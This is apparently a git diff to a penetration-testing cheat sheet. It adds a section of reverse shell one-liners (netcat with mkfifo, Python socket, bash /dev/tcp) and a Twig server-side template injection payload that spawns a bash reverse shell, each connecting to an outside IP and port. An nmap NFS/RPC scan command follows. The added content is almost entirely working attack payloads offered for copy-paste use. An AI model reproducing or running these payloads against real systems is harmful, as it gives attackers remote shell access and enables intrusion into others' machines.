@@ -1,4 +1,27 @@
 [back](../README.md)
+# reverse shells
+```sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
+```
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+```bash
+bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
+sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
+```
+
+```js
+{{this.controller.getTwig().registerUndefinedFilterCallback("passthru")}}
+{{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
+```
+
 # scan rpc port
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
